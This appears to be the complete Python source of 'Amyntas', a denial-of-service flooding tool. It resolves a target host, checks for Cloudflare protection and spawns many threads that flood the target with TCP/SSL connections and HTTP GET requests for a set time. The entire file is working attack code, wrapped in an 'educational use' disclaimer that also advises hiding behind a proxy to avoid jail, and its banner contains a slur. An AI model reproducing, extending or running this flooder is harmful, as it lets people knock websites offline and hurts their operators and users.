#!/usr/bin/env python3

import argparse, socks, socket, ssl, time, sys, threading, os, requests
from random import randint, choice
from colorama import Fore
from netaddr import IPNetwork, IPAddress

def clear():
    os.system('cls' if os.name.startswith('nt') else 'clear') # Magic

# Basic colours lol
r  = Fore.RED
y  = Fore.YELLOW
w  = Fore.WHITE
rr = Fore.RESET

icons = [
    '+',
    '-',
    '!',
    '*',
    '~',
    ':',
    '%',
    '@',
    '#',
    '$',
    '&',
    'ø',
    '©'
]

version = '5'
desc = f'{w}Thanks for using Amyntas {version}.0! Use a proxy to be safe, unless you want to end up in jail.'

# Arguments
parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://target.domain', description=desc, allow_abbrev=False)
parser.add_argument('-t',  '--target',       dest = 'target',       default = 'https://target.com',   help='Target URL (Example: https://google.com or http://fishysite.com)', type=str)
parser.add_argument('-v',  '--verbose',      dest = 'verbose',      default = False,                  help='Show info when attacking', type=bool)
parser.add_argument('-d',  '--duration',     dest = 'duration',     default = 80,                     help='Attack duration', type=int)
parser.add_argument('-p',  '--proxy',        dest = 'proxy',        default = '',                     help='Use a proxy when attacking, only supports SOCKS5 (Example: 127.0.0.1:1337)', type=str)
#parser.add_argument('-pl', '--proxy-list',   dest = 'proxylist',    default = '',                     help='Path to file with [SOCKS5] proxies', type=str)
#parser.add_argument('-u',  '--user-agents',  dest = 'ualist',       default = 'lists/useragents.txt', help='Path to list of user agents', type=str)
#parser.add_argument('-r',  '--referers',     dest = 'reflist',      default = 'lists/referers.txt',   help='Path to list of referrers', type=str)
parser.add_argument('-w',  '--workers',      dest = 'workers',      default = 100,                    help='Amount of threads to use when attacking', type=int)
args = parser.parse_args()

banner = f'''{r}
       d8888                                 888                      
      d88888                                 888                      
     d88P888                                 888                      
    d88P 888 88888b.d88b.  888  888 88888b.  888888  8888b.  .d8888b  
   d88P  888 888 "888 "88b 888  888 888 "88b 888        "88b 88K      
  d88P   888 888  888  888 888  888 888  888 888    .d888888 "Y8888b. 
 d8888888888 888  888  888 Y88b 888 888  888 Y88b.  888  888      X88 
d88P     888 888  888  888  "Y88888 888  888  "Y888 "Y888888  88888P' v{version} :)
                                888                                   
                           Y8b d88P                                   
                            "Y88P"

{r}[{w}Disclaimer{r}]
{w}I, the author, am not responsible for anything you attack! I made this tool for people to
purely attack THEIR OWN SYSTEMS. I do not condone illegal use of it!

{r}"{w}Purely for educational use only{r}"

{w}If you wish to attack systems that you DO NOT OWN, make sure you know what you are doing!
Use a proxy to be safe, unless you want to end up in jail.
If you still wish to sue me, emails go here {r}[{w}fuck.you@fag.gov{r}]{w}

Stay safe.
{r}[{w}------------------------------------------------------------------------------------------{r}]{rr}
'''

class Util:
    def isCF(self, ip): # credits to Wreckuests
        cf_subnet = requests.get('https://www.cloudflare.com/ips-v4').text
        ipv4 = [row.rstrip() for row in cf_subnet.splitlines()]

        for i in range(len(ipv4)):
            if IPAddress(ip) in IPNetwork(ipv4[i]):
                return True    

# Attack script
class DDoS:
    def attack(self, threadcount):
        try:
            #if args.proxy:
            #    ip, port = args.proxy.split(':')
            #    if args.verbose:
            #        print(f'{r}[{rr}{choice(icons)}{r}]{rr} [THREAD {threadcount}] Proxy set to {args.proxy}')
            #
            #    sock.set_proxy(socks.SOCKS5, str(ip), int(port))

            url = args.target
            connect_port = 80
            if url.startswith('http://'): # If its HTTP
                connect_port = 80
                host = url.strip('http://')

            elif url.startswith('https://'): # If its HTTPS
                connect_port = 443
                host = url.strip('https://')
            
            target = socket.gethostbyname(host)
            
            stop = time.time() + args.duration # Get the time
            while time.time() < stop:
                try:
                    sock = socks.socksocket()
                    sock.settimeout(3)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setblocking(False)

                    if connect_port==443: sock = ssl.wrap_socket(sock)
                    sock.connect((target, connect_port))

                    try: sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'.encode() )
                    except: pass
                except:
                    pass     

            try: sock.shutdown(socket.SHUT_RDWR) # shutdown gracefully
            except: sock.close()

            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} Socket shut down.')

        except KeyboardInterrupt:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} CTRL-C pressed, lets exit!')
            sys.exit()

        # Connection errors
        except ConnectionResetError:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} Connection Reset!')
                pass

        except ConnectionRefusedError:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} Connection Refused!')
            pass

        except ConnectionAbortedError:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} Connection Aborted! Check if any anti-virus or firewalls may be interrupting.')
            pass
        
        except ssl.SSLWantReadError:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} SSL reading error, server might be down or busy.')
            pass
        
        except ssl.SSLError as e:
            if args.verbose:
                print(f'{r}[{rr}{choice(icons)}{r}]{rr} SSL error: {str(e)}')
            pass


# Print the usage
def usage():
    print(f'{r}[{w}#{r}] {y}{"-"*12}{w}Amyntas {version} Usage{y}{"-"*12} {r}[{w}#{r}]{rr}')
    print(f'   python {sys.argv[0]} -t http://target.domain')
    print(f'    type python {sys.argv[0]} -h for more info')
    print(f'{r}[{w}#{r}] {y}--------------------------------------- {r}[{w}#{r}]{rr}')
    exit()

# Main
def main():
    clear()

    if len(sys.argv) < 2:
        usage()

    else:
        try:
            #if args.proxylist:
            #    Load.proxylist()
            #    print(f'{r}[ {w}Loaded {len(proxy_list)} proxies from ({args.proxylist}) {r}]{rr}')
            
            #if args.ualist:
            #    Load.useragents()
            #    print(f'{r}[ {w}Loaded {len(useragents)} useragents from ({args.ualist}) {r}]{rr}')
            
            #if args.reflist:
            #    print(f'{r}[ {w}Loaded {len(referers)} referers from ({args.reflist}) {r}]{rr}')
            #    Load.referrers()


            print(banner)
            target_ip = args.target.strip('http://').strip('https://').strip('/')
            
            if Util().isCF( socket.gethostbyname(target_ip) ):
                print(f'\n{r}{args.target}{rr} is protected by {y}CloudFlare{rr}, the attack might fail!')

            yn = input(f'\nLocked onto {r}{args.target}{rr}. Correct? (Y/N) ').upper() # Verify it

            if yn.startswith('Y'):

                print(f'Building {r}{args.workers}{rr} threads.')
                threads = []

                for x in range(args.workers):
                    kaboom = threading.Thread(target=DDoS().attack, args=(x,), daemon=True)#.start()
                    threads.append(kaboom)

                print(f'Threads built. Ready to fire.')
                yn = input('Ready? (Y/N) ').upper() # Verify again
                sure = input('You absolutely ready? (Y/N) ').upper() # Just to make sure

                if yn.startswith('Y') and sure.startswith('Y'):
                    print(f'{r}[{rr}!{r}]{rr} Launching attack on {r}{args.target}{rr}.')
                    count = 0

                    #start_count = time.time()
                    for thread in threads: # Starts every single thread
                        count += 1
                        print(f'{r}[{rr}{choice(icons)}{r}]{rr} Started thread {r}{count}{rr}.')
                        thread.start()

                    print(f'{r}[{rr}!{r}]{rr} All threads started.')

                    for thread in threads:
                        thread.join()
                    
                    #stop_count = time.time() - start_count
                    print(f'{r}[{rr}!{r}]{rr} All threads have finished attacking.\n')
                    #print(f'{r}[{rr}Attack Results{r}]{rr}')
                    #print(f'Requests sent: {r}{requests_sent}{rr}')
                    #print(f'Average requests per second: {r}{str(requests_sent/stop_count)}{rr}')
                    #print(f'{r}[{rr}End{r}]{rr}')
                    sys.exit()

                else:
                    print('Goodbye!')
                    exit()
            else:
                print('Goodbye!')
                exit()
        except KeyboardInterrupt:
            print('\nCTRL-C Pressed. Closing now.')
            exit()

if __name__ == '__main__':
    main()
